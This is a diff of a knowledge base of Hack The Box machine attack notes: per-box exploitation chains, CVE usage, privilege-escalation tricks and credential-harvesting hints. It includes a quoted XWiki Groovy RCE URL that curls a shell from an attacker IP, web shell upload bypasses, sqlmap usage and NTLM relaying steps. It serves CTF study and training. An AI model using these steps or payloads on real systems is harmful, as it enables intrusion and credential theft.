-- Inspect IIS bindings and configuration (`applicationHost.config`, site-level `web.config`, app pools, physical paths, connection strings, and internal host headers). A second binding/application can expose a hidden site or stronger execution identity.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
@@ -1149,9 +1158,10 @@ Usage is an easy Linux machine that features a blog site vulnerable to SQL injec
 - Test the blog/admin authentication workflow for SQL injection, dump the administrator hash, and crack it offline.
 - After admin login, fingerprint the Laravel admin/file-manager component and exploit its outdated upload behavior to place a PHP web shell.
 - From the web shell, search application/user files for plaintext credentials and test reuse against local users/SSH.
+- Test the email parameter in POST /forget-password, save the complete CSRF/session request as reset.req, and use sqlmap -r reset.req -p email --batch --level 3; the default level produces 500/503 responses and misses the boolean/time-based injection used to dump usage_blog.admin_users.
+- CVE-2023-24249 is in Laravel Admin's avatar settings: upload PHP renamed to shell.jpg, intercept the request and change filename= to shell.jpg.php, then request /uploads/images/shell.jpg.php?melo=<command>; a direct .php upload is rejected.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Test upload validation separately for extension, MIME, magic bytes, filename/path, and post-upload execution. Determine the exact storage path and whether timing/name prediction is involved.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
@@ -1164,10 +1174,11 @@ Usage is an easy Linux machine that features a blog site vulnerable to SQL injec
 - Observe the Project Backup command via process monitoring: /usr/bin/7za a /var/backups/project.zip -tzip -snl -mmt -- * runs as root from a user-writable web directory.
 - Understand 7-Zip listfile syntax: a filename beginning with @ is interpreted as a file containing paths to archive.
 - Create @id_rsa plus an id_rsa symlink to /root/.ssh/id_rsa in the backup source directory.
+- After landing as dash, run ss -tlpn and investigate loopback 127.0.0.1:2812; /proc is mounted hidepid=2, but Monit runs as dash, so ~/.monitrc is readable and its allow admin:<password> value is reused to SSH as xander.
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → subdomain enumeration → SQL injection → database enumeration → password cracking → CVE-2023-24249 → file upload abuse → web shell/RCE → reverse shell
+**Memory chain:** forgot-password SQL injection → Laravel Admin avatar filename bypass → PHP web shell → Monit credential reuse → SSH as xander
 
 - Upgrading our web shell to an interactive reverse shell is trivial; we start by generating a payload on revshells.
 - see that the port belongs to a process monit , with a process ID (PID) of 33663 .
@@ -1200,13 +1211,14 @@ Open the PDF around page **10** and search for the technologies, functions, file
 - Trigger the root Project Backup option so 7-Zip follows the symlink while parsing the @id_rsa listfile and discloses the root private key.
 - Extract/copy the key from output/archive, preserve formatting, chmod 600, and SSH as root.
 - The subtle bug is @listfile parsing combined with a symlink, not merely the -snl option by itself.
+- The 7-Zip escalation is deterministic `@listfile` parsing combined with an `id_rsa` symlink to `/root/.ssh/id_rsa`; it is not a race condition, even though the backup command includes `-snl`.
 - Run `sudo -l` and inspect the permitted command's exact version, arguments, environment, working directory, and files it reads. Search GTFOBins, but also review application-specific behavior.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 
 ### Root / Administrator path
 
-**Memory chain:** sudo rule abuse → database enumeration → symlink/race-condition abuse → LFI/local file read → private-key discovery → SSH
+**Memory chain:** sudo usage_management backup → 7-Zip @listfile parsing → id_rsa symlink → root private-key disclosure → SSH as root
 
 - Reset admin password Enter your choice (1/2/3): We get an option to either back up the project, the MySQL database, or reset the admin's password.
 - When 7zip attempts to read the list of files from id_rsa , it instead reads the content of /root/.ssh/id_rsa . xander@usage:/var/www/html$ ln -s /root/.ssh/id_rsa id_rsa 3.
@@ -1242,9 +1254,9 @@ Titanic is an easy difficulty Linux machine that features an Apache server liste
 - Use the booking download/path parameter as an arbitrary file read, combining it with the Gitea Docker volume path learned from compose files.
 - Retrieve the Gitea SQLite database, extract the developer password hash with its parameters/salt, convert it to the proper Hashcat format, and crack it.
 - Use the recovered developer credential over SSH.
+- Docker Compose is used only to reveal the mounted Gitea database path for the booking file-read primitive. Crack the recovered SQLite credential and SSH as developer; there is no LXD/LXC or container escape.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
@@ -1259,7 +1271,7 @@ Titanic is an easy difficulty Linux machine that features an Apache server liste
 
 ### User path
 
-**Memory chain:** SSH → virtual-host enumeration → group-membership abuse → LFI/local file read → LXD/LXC abuse → Git history/config → directory/file discovery → subdomain enumeration → Docker/container escape → configuration-file secrets
+**Memory chain:** Gitea vhost and Docker volume mapping → booking arbitrary file read → Gitea SQLite hash cracking → SSH as developer
 
 - If we manage to access it we might get access to encrypted user passwords.
 - The database file is typically named gitea.db , however, attempting to access /home/developer/gitea/data/gitea.db does not seem to work.
@@ -1288,11 +1300,12 @@ Open the PDF around page **8** and search for the technologies, functions, filen
 - Exploit CVE-2024-41817 by placing the crafted ImageMagick configuration/payload and trigger image in the writable images directory.
 - Wait for the periodic root image-identification job to load the malicious content and execute the payload.
 - The key chain is writable input directory plus recurring root magick execution; merely finding the CVE is insufficient.
+- CVE-2024-41817 is triggered by compiling the constructor payload specifically as libxcb.so.1 inside /opt/app/static/assets/images; the recurring root magick identify job loads that library from its working directory, creates the SUID /tmp/sh, and the shell must be run with -p.
 - Enumerate nonstandard SUID files and compare them with GTFOBins. If custom, inspect strings/imports/config paths and environment handling rather than only executing it directly.
 
 ### Root / Administrator path
 
-**Memory chain:** database enumeration → Docker/container escape → CVE-2024-41817 → SUID abuse
+**Memory chain:** writable image work directory → recurring root magick identify → CVE-2024-41817 libxcb.so.1 load → SUID /tmp/sh -p
 
 - System enumeration reveals a MySQL installation as hinted by the Docker compose file we identified earlier, however, the database does not seem to hold any valuable information.
 - A quick Google search with the keywords magick exploit poc reveals this advisory, which details an Arbitrary Code Execution vulnerability in the same version of magick and is assigned CVE-2024-41817.
@@ -1327,10 +1340,12 @@ Outbound is an easy-difficulty Linux machine with provided assumed breach creden
 - Read /var/www/html/roundcube/config/config.inc.php for the local Roundcube MySQL credential.
 - Enumerate the Roundcube session table, base64/decode serialized session data, and identify Jacob's encrypted stored password.
 - Use Roundcube's own decrypt.sh/config key rather than attempting to crack the ciphertext; then log in as Jacob and read both inbox messages for the updated system password and sudo clue.
+- Fuzz the Host header and add mail.outbound.htb locally; Roundcube is hosted on that vhost while the base hostname presents only the default Nginx page.
+- CVE-2025-49113 reaches unsafe unserialize through the attacker-controlled _from parameter in upload.php's authenticated image-upload handler; preserve the valid Roundcube session when sending the exploit.
+- The foothold chain is the assumed-breach Roundcube login, authenticated CVE-2025-49113 deserialization, Roundcube session-password decryption, then Jacob's email/SSH credential. Git history and group-membership abuse are not transitions in this path.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Identify the exact serialization format, signing/encryption boundary, and gadget environment before generating a payload; source review often reveals the required class/library.
-- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 
 ### Post-foothold local enumeration and lateral movement
@@ -1342,7 +1357,7 @@ Outbound is an easy-difficulty Linux machine with provided assumed breach creden
 
 ### User path
 
-**Memory chain:** SSH → virtual-host enumeration → directory/file discovery → subdomain enumeration → group-membership abuse → web shell/RCE → unsafe deserialization → Git history/config → CVE-2025-49113 → configuration-file secrets
+**Memory chain:** assumed-breach Roundcube login → CVE-2025-49113 authenticated deserialization → Roundcube session-password decryption → Jacob email credential → SSH as jacob
 
 - The output also reveals the domain outbound.htb , which we can add to our /etc/hosts file. $ echo "10.129.237.221 outbound.htb" |sudo tee -a /etc/hosts HTTP Upon visiting the landing page, we see the default landing page for Nginx.
 - Searching online for Roundcube 1.6.10 reveals this link which is a disclosure addressing a how this Roundcube version is susceptible to remote code execution through PHP object deserialization through a unsafe unserialize() function on user-controlled data via the _from parameter in the image upload handler in upload.php .
@@ -1372,7 +1387,7 @@ Open the PDF around page **3** and search for the technologies, functions, filen
 
 ### Root / Administrator path
 
-**Memory chain:** sudo rule abuse → source-code review → symlink/race-condition abuse
+**Memory chain:** sudo below → CVE-2025-27591 log-file handling → /etc/passwd symlink and newline injection → UID-0 account
 
 - Now we need to figure out how to abuse this.
 - 10m, 3d2H, 5h30s, 10m5h Absolute: "Jan 01 23:59", "01/01/1970 11:59PM", "1970-01-01 23:59:59" Unix Epoch: 1589808367 ------------------------------------------------------------- Now we can write to the log file as the root user, but now we need to validate if we can add newlines into our payload.
@@ -1415,10 +1430,11 @@ Editor is an easy-difficulty Linux machine that focuses on web application explo
 - List /home and test the recovered application password against the real user oliver over SSH.
 - Check oliver's groups: membership in netdata grants execution of root-owned SUID Netdata plugins.
 - Enumerate Netdata SUID files and inspect /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo --help for trusted executable names such as nvme.
+- XWiki RCE leads to `/etc/xwiki/hibernate.cfg.xml`; reuse that credential as Oliver, then abuse Oliver's netdata-group access to SUID `ndsudo` and its PATH lookup of attacker-controlled `nvme`. LXD/LXC is not used.
 
 ### User path
 
-**Memory chain:** SSH → group-membership abuse → CVE-2025-24893 → web shell/RCE → LXD/LXC abuse → database enumeration → reverse shell
+**Memory chain:** XWiki CVE-2025-24893 → Groovy command execution → hibernate.cfg.xml credential → SSH as oliver
 
 - Foothold CVE-2025-24893 - Local access as user xwiki Researching for vulnerabilities related to XWiki version 15.10.8 , we come across CVE2025-2483, which details a remote code execution vulnerability through the SolrSearch endpoint.
 - BASE: curl 10.10.15.42/shell -o /tmp/shell ENCODED: curl%2010.10.15.42%2Fshell%20-o%20%2Ftmp%2Fshell INSIDE THE SCRIPT: def exploit(target_url): target_url = detect_protocol(target_url.replace("http://", "").replace("https://", "").strip()) exploit_url = f"{target_url}/bin/get/Main/SolrSearch? media=rss&text=%7d%7d%7d%7b%7basync%20async%3dfalse%7d%7d%7b%7bgroovy%7d%7dpri ntln(%22curl%2010.10.15.42%2Fshell%20o%20%2Ftmp%2Fshell%22.execute().text)%7b%7b%2fgroovy%7d%7d%7b%7b%2fasync%7d%7d " Running the script again, the executable is uploaded on the target system.
@@ -1449,7 +1465,7 @@ Open the PDF around page **4** and search for the technologies, functions, filen
 
 ### Root / Administrator path
 
-**Memory chain:** SUID abuse → PATH hijacking → reverse shell
+**Memory chain:** netdata group → SUID ndsudo → attacker-controlled nvme via PATH → root shell
 
 - Netdata local privilege escalation The oliver user is a member of a group called netdata which is not standard.
 - It is typical to run local enumeration tools such as linpeas when we gain access to the local system.
@@ -1482,17 +1498,19 @@ Expressway is an easy-difficulty Linux machine that demonstrates enumeration and
 - Use ike-scan aggressive mode to fingerprint the transform, group name/identity, and capture material suitable for offline PSK cracking.
 - Use --pskcrack output with Hashcat to recover the pre-shared key/password and combine it with the leaked IKE username.
 - Test the recovered credential over SSH.
-- Enumerate SNMP with common/default community strings and walk users, processes, installed software, listening ports, and command-line arguments—not only system metadata.
+- Enumerate UDP/69 as well as IKE: tftp-enum.nse reveals ciscortr.cfg, and unauthenticated TFTP get ciscortr.cfg exposes the ike username and target hostname needed to interpret the IKE material.
+- UDP/161 is closed in the writeup. The overlooked services are TFTP/69, which leaks `ciscortr.cfg`, and IKE/500, whose captured PSK material is cracked for SSH access.
 
 ### Post-foothold local enumeration and lateral movement
 
 - Run sudo -l and capture the installed sudo version; the vulnerable behavior is version-specific.
 - For CVE-2025-32462, enumerate host-specific sudo rules with the -h behavior and identify a configured host where ike may run commands.
 - Also understand the alternate CVE-2025-32463 chroot/NSS path described in the writeup: it requires staging nsswitch.conf and a malicious NSS library.
+- For CVE-2025-32462, inspect ike's proxy group-readable files; /var/log/squid/access.log.1 reveals offramp.expressway.htb, which is the host argument for sudo -h offramp.expressway.htb -l and then sudo -h offramp.expressway.htb bash.
 
 ### User path
 
-**Memory chain:** SSH → SNMP enumeration → network-device config secrets → password cracking
+**Memory chain:** UDP TFTP ciscortr.cfg → IKE aggressive-mode capture → PSK cracking → SSH as ike
 
 - can see it mentioning the IKE service, which is a component of the IPsec framework.
 - This is primarily used to create encrypted tunnels to allow secure communication over a network.
@@ -1522,7 +1540,7 @@ Open the PDF around page **3** and search for the technologies, functions, filen
 
 ### Root / Administrator path
 
-**Memory chain:** sudo rule abuse → CVE-2025-32462/CVE-2025-32463
+**Memory chain:** proxy-readable Squid access.log.1 → offramp.expressway.htb sudo host rule → sudo -h host-option abuse → root shell
 
 - For us to exploit this, we need to find a host configured so that the ike user is allowed to list the sudo permissions.
 - So let's run /bin/bash to get an interactive shell as the root user. ike@expressway:~$ sudo -h offramp.expressway.htb bash root@expressway:/home/ike# whoami root Now we have a privileged shell as the root user.
@@ -1558,7 +1576,6 @@ ServMon is an easy Windows machine featuring an HTTP server that hosts an NVMS-1
 - Password-spray the recovered list against SSH for the enumerated Windows users; nadine has the working password.
 - Keep the case/path/encoding required by the NVMS traversal payload.
 - Try anonymous FTP and inspect every downloadable file, including hidden/configuration/backup material and binary-transfer artifacts.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
 - Turn file read/LFI into targeted discovery: source code via wrappers, environment/config files, SSH keys, logs, and service credentials. Test traversal normalization and encoding.
 - Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
@@ -1639,7 +1656,6 @@ Support is an Easy difficulty Windows machine that features an SMB share that al
 - Bind to LDAP as support\ldap with the recovered password and query users with all attributes, not just account names.
 - Read the support user's info attribute for the cleartext password and verify membership in Remote Management Users before using WinRM.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Obtain and read source code for route names, hidden parameters, database queries, local file paths, secrets, and unsafe command/template construction.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
@@ -1841,7 +1857,6 @@ Open the PDF around page **6** and search for the technologies, functions, filen
 - Recover the Administrator password from Firefox process memory and test it over WinRM.
 - If multiple Firefox PIDs exist, dump/search each process or the parent/content process set; the credential may not be in the first PID.
 - The escalation is credential recovery from a privileged GUI process, not a service/kernel exploit.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 
 ### Root / Administrator path
 
@@ -1880,7 +1895,7 @@ Active is an easy to medium-difficulty Windows machine, which features two very 
 - Recursively download/browse the domain policy tree under Replication and inspect Groups.xml rather than stopping at share names.
 - Extract the Group Policy Preferences cpassword from Groups.xml and decrypt it with gpp-decrypt to recover the SVC_TGS credential.
 - Re-enumerate SMB with SVC_TGS and retrieve the user flag/files available to the authenticated account.
-- Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
+- Stay on the anonymous Replication/SYSVOL -> GPP `cpassword` -> authenticated Kerberoast path; LAPS password retrieval is not part of Active.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
@@ -1924,12 +1939,13 @@ Open the PDF around page **5** and search for the technologies, functions, filen
 - Use the cracked Administrator domain credential with PsExec/WMIExec or equivalent SMB remote execution to obtain SYSTEM on the DC.
 - Maintain the domain context (ACTIVE\Administrator) and correct target hostname/IP; a local-auth attempt is the wrong authentication mode.
 - The full chain is anonymous Replication share -> GPP cpassword -> authenticated Kerberoast -> Administrator remote execution.
+- Crack the Administrator TGS to its plaintext password, then use password-authenticated PsExec/WMIExec. This writeup does not recover an Administrator NTLM hash for pass-the-hash.
 - Search SYSVOL/NETLOGON for Group Policy Preference XML files and decrypt any `cpassword`; then test the recovered credential on SMB/WinRM and for Kerberoasting.
 - With any valid domain credential or ticket, request SPN service tickets (`GetUserSPNs`) and crack them; do not assume the SPN account is obviously privileged.
 
 ### Root / Administrator path
 
-**Memory chain:** Kerberoasting → password cracking → pass-the-hash/PsExec
+**Memory chain:** Kerberoast Administrator SPN → crack Administrator plaintext password → password-authenticated WMIExec/PsExec
 
 - Kerberoasting involves extracting a hash of the encrypted material from a Kerberos “Ticket Granting Service” ticket reply (TGS_REP), which can be subjected to offline cracking in order to retrieve the plaintext password.
 - This is possible because the TGS_REP is encrypted using the NTLM password hash of the account in whose context the service instance is running.
@@ -2056,7 +2072,6 @@ Sauna is an easy diﬃculty Windows machine that features Active Directory enume
 - Try LDAP with an anonymous simple bind (`ldapsearch -x` / blank user). Request the naming contexts first, then query the discovered base DN for users, groups, descriptions, and memberships.
 - Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
 - Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - After finding valid users, test every account for Kerberos pre-authentication disabled (`GetNPUsers`), then crack the returned AS-REP hash offline.
 
 ### Post-foothold local enumeration and lateral movement
@@ -2095,7 +2110,6 @@ Open the PDF around page **7** and search for the technologies, functions, filen
 - Use svc_loanmgr's replication rights for a DCSync/secretsdump request targeting the domain Administrator.
 - Pass the retrieved Administrator NTLM hash to psexec for NT AUTHORITY\SYSTEM.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
-- Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
 
 ### Root / Administrator path
@@ -2210,9 +2224,9 @@ Timelapse is an Easy Windows which involves accessing a publicly accessible SMB 
 - Download winrm_backup.zip from the Dev folder; use zip2john/John because the archive is password protected.
 - The archive contains legacyy_dev_auth.pfx; convert the PFX with pfx2john and crack its separate import password.
 - Use OpenSSL to extract both the client certificate and private key, then authenticate to WinRM with certificate/key options rather than a password.
+- If the Python 3 pfx2john output includes literal b'...' wrappers, strip those wrappers before giving the hash to John; otherwise the valid PFX hash may not parse/crack.
 - Check who can read LAPS attributes and query the correct computer object. The password is host-specific; use it with the local Administrator context, not automatically as a domain credential.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
-- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
 - Read PowerShell history for commands and credentials, then test whether the discovered account enables lateral movement or privileged remote access.
 
 ### Post-foothold local enumeration and lateral movement
@@ -2292,7 +2306,6 @@ Cicada is an easy-difficult Windows machine that focuses on beginner Active Dire
 - Read the HR share's Notice from HR file and capture the onboarding/default password embedded in it.
 - Run impacket-lookupsid as cicada.htb/guest with -no-pass; filter SidTypeUser results into a clean username list.
 - Password-spray the default password across the RID-derived users and then re-enumerate shares under every successful identity.
-- Inspect TLS certificate SAN/CN values for hidden virtual hosts and add each name to `/etc/hosts` before directory/content discovery.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
 - Try product-specific default credentials and obvious username/password pairs before exploit development; also search tickets/readmes for changed defaults.
@@ -2480,7 +2493,6 @@ Eighteen is an easy difficulty Windows machine that demonstrates common weakness
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Check whether MSSQL `xp_cmdshell` is enabled or can be enabled by the current role; distinguish database-level access from OS command execution.
 - Enumerate MSSQL `IMPERSONATE` permissions and test `EXECUTE AS LOGIN/USER`; re-check effective server roles after impersonation.
-- Perform RID/SID cycling with `impacket-lookupsid`; save only `SidTypeUser` names for spraying. Try null, guest, and any low-privilege credential because each may expose different ranges.
 - Use MSSQL-assisted RID brute forcing when the available login is a SQL-local account. Remember `--local-auth`; a domain-auth attempt can fail even when the SQL credential is valid.
 - Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
 
@@ -2523,6 +2535,7 @@ Open the PDF around page **6** and search for the technologies, functions, filen
 - Use SharpSuccessor to create a dMSA in the Staff OU and link it to Administrator via the BadSuccessor attributes.
 - Use Rubeus tgtdeleg, then request/inject a dMSA TGS for the new account to inherit Administrator-equivalent access.
 - Verify the resulting ticket by reading the Administrator share/root file over CIFS.
+- SharpSuccessor/BadSuccessor may print an error after creating the weaponized dMSA; verify the logs/directory object and continue when creation succeeded instead of treating every terminal error as fatal.
 - Collect and inspect BloodHound edges beyond shortest path: ACL ownership, group nesting, session location, delegation, object control, and OU inheritance.
 
 ### Root / Administrator path
@@ -2570,6 +2583,7 @@ Escape is a Medium difficulty Windows Active Directory machine that starts with 
 - Enumerate C:\sqlserver\Logs and read ERRORLOG.bak; it records Ryan.Cooper's failed login with a plaintext password.
 - Test the rejected MSSQL password as Ryan.Cooper on WinRM because users commonly reuse passwords across services.
 - Revisit Nmap's certificate-related output and enumerate the installed CA/templates with Certify.
+- The writeup's Certify tooling has no ready release executable; build Certify in Visual Studio before uploading/running it to enumerate the CA and ESC1 template.
 
 ### User path
 
@@ -2654,7 +2668,6 @@ Monteverde is a Medium Windows machine that features Azure AD Connect. The domai
 - Check the domain lockout policy before spraying; with no threshold, build a user list and include usernames in the candidate password list.
 - Try LDAP with an anonymous simple bind (`ldapsearch -x` / blank user). Request the naming contexts first, then query the discovered base DN for users, groups, descriptions, and memberships.
 - Test a true SMB null session: blank username and blank password (`smbclient -L //<target> -N`, `netexec smb <target> -u '' -p ''`). A successful login can still reveal users/RIDs even when no useful share is listed.
-- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
 - Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
 - Build a clean username list and password-spray deliberately across the protocol that is actually reachable. Test username-as-password and discovered defaults, while avoiding lockout/rate-limit mistakes.
@@ -2745,7 +2758,6 @@ Cascade is a medium diﬃculty Windows machine conﬁgured as a Domain Controlle
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 - Run `windapsearch` with a blank identity; test user enumeration and privileged/remote-management group membership even if the first anonymous query returns little data.
 - Read AD user descriptions and notes; administrators often leave onboarding/default passwords or operational clues there.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Search web roots, shares, home directories, and application folders for backups/archives. Inspect both contents and metadata; crack protected archives when needed.
 - Identify who belongs to `Remote Management Users`; a valid password/hash/certificate is not enough for WinRM unless the account has logon rights.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
@@ -2839,7 +2851,6 @@ TheFrizz is a medium-difficulty Windows machine featuring a web application show
 - Use XAMPP's local mysql.exe to query gibbonperson, recover f.frizzle's salted password hash, and crack it offline.
 - Configure Kerberos/DNS/time, request f.frizzle's TGT, and use SSH with GSSAPI (-K), not password SSH.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
-- Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
 
 ### Post-foothold local enumeration and lateral movement
 
@@ -2917,6 +2928,7 @@ Puppy is a Medium Difficulty machine that features a non-default SMB share calle
 - Download recovery.kdbx from DEV, extract its hash, crack the KeePass password, and inventory every credential in the database.
 - Spray the KeePass passwords to identify Ant.Edwards, then use Ant's GenericAll over Adam.Silver to reset Adam's password and re-enable the disabled account.
 - Use Adam.Silver over WinRM for the first interactive foothold.
+- If the distro keepass2john reports KeePass file version 40000 unsupported, install/use a current John build (the writeup uses john-the-ripper.keepass2john via snap) and crack with --format=KeePass; the old extractor cannot handle the Argon2/newer database.
 - Run `showmount -e`, mount exported NFS paths, inspect UID/GID behavior, and check whether `no_root_squash` or writable content enables escalation.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Inspect SYSVOL and NETLOGON recursively for scripts, XML preferences, deployment passwords, domain names, and stale credentials.
@@ -3145,10 +3157,10 @@ Open the PDF around page **1** and search for the technologies, functions, filen
 - Run ntlmrelayx targeting WinRMS with the appropriate protocol client while coercing the DC/machine to authenticate to its marshaled self-name.
 - CVE-2025-33073 permits self-relay/reflection despite SMB signing; verify both the coercion and successful relayed login before expecting command execution.
 - Use the relayed WinRMS context for privileged command execution/Administrator access.
+- WinRMS relaying requires Impacket v0.13.0 with the WINRMS protocol client; older ntlmrelayx builds will not support the winrms:// target.
+- Run ntlmrelayx through the pivot with -t winrms://<DC> -smb2support; after coercion, HTTP 500 is expected and can still mean a successful relayed login.
+- A successful WinRMS relay opens the interactive shell on 127.0.0.1:11000 through the SOCKS path; connect to that local endpoint rather than expecting a normal Evil-WinRM session.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
-- Test SMB/RPC as `guest` with no password as a separate case from a blank null session. Use it for share listing and SID/RID enumeration even if file access is limited.
-- Enumerate AD CS with `certipy find -vulnerable`; inspect template enrollment rights, subject-name control, EKUs, manager approval, CA officer rights, and web enrollment. Map the exact ESC path before requesting a certificate.
-- Verify DCSync rights (`DS-Replication-Get-Changes*`) and use `secretsdump` against the DC. Distinguish a local SAM dump from an NTDS/domain dump.
 
 ### Root / Administrator path
 
@@ -3278,7 +3290,7 @@ UpDown is a medium difficulty Linux machine with SSH and Apache servers exposed.
 - Directory enumeration exposes .git; dump the repository and inspect source/history for the dev-only header and upload logic.
 - Supply the required special HTTP header to access the dev vhost; without it the host appears unavailable.
 - Review PHP blacklist/extension validation and use a ZIP/PHAR polyglot plus phar:// inclusion to execute an uploaded PHP payload.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
+- The dumped .htaccess gives the exact gate for the developer vhost: send the HTTP header Special-Dev: only4dev; without that header dev.siteisup.htb intentionally denies access.
 - Read the target's own hosts file after foothold; internal aliases and backend names may not exist in external DNS. Add relevant names locally or preserve them in tunneled Host headers.
 - Run virtual-host discovery with the correct Host header and filter the baseline response size; do not stop at directory brute forcing the default site.
 - Enumerate exposed/local Git metadata: remotes, branches, commit history, diffs, and deleted files. Search history—not just the current tree—for credentials and source changes.
@@ -3362,7 +3374,6 @@ Magic is an easy diﬃculty Linux machine that features a custom web application
 - Bypass the image-extension whitelist with a valid image header plus PHP payload and a double/allowed filename, then locate the uploaded path.
 - Trigger the uploaded PHP through Apache to obtain a www-data shell.
 - Manually validate SQL injection and determine the backend/column count. If automation fails, use DB-specific functions and nested queries rather than abandoning the lead.
-- Look for browser credential stores and live browser processes. Copy the full profile database set or dump process memory, then extract/decrypt credentials offline.
 - Enumerate every web root after foothold, not only the public site's directory. Correlate source files with Nginx/Apache/IIS bindings to discover hidden applications, credentials, upload paths, and code-execution sinks.
 - After foothold, enumerate local listeners with `ss -lntup`/`netstat` and map each PID/process. Tunnel or access services bound only to `127.0.0.1`/IPv6 loopback; external Nmap cannot see them.
 
@@ -3445,8 +3456,6 @@ Monitored is a medium-difficulty Linux machine that features a Nagios instance. 
